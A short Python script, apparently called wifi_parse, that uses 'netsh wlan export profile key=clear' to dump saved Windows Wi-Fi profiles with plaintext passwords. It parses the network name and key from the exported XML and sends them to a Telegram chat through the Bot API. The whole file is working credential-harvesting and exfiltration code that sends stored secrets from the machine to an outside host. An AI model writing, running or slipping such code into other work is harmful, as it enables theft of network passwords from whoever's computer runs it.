from xml.dom import minidom
from dotenv import load_dotenv
import os
import requests
import subprocess


load_dotenv()

FILENAME_DIR = os.path.basename(__file__)
PROJECT_DIR = os.path.abspath(__file__).replace(FILENAME_DIR, '')

BOT_TOKEN = os.getenv('BOT_TOKEN')
USER_ID = os.getenv('USER_ID')
WIFI_NAME = os.getenv('WIFI_NAME')


subprocess.call("netsh wlan show profile")
subprocess.call("netsh wlan export profile folder="
                f"{PROJECT_DIR}\\data key=clear")


def main():
    for file in os.listdir("D:\\Dev\\wifi_parse\\data"):
        if file.endswith(f"{WIFI_NAME}.xml"):
            document = minidom.parse(f"D:\\Dev\\wifi_parse\\data\\{file}")

            names = document.getElementsByTagName("name")
            keyMaterials = document.getElementsByTagName("keyMaterial")

            if names:
                names = document.getElementsByTagName("name")[0]
                name = names.firstChild.data

            if keyMaterials:
                keyMaterials = document.getElementsByTagName("keyMaterial")[0]
                keyMaterial = keyMaterials.firstChild.data

            wifi = {
                "name": name,
                "password": keyMaterial
            }

            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/"
                         f"sendMessage?chat_id={USER_ID}&text={wifi}")


if __name__ == '__main__':
    main()
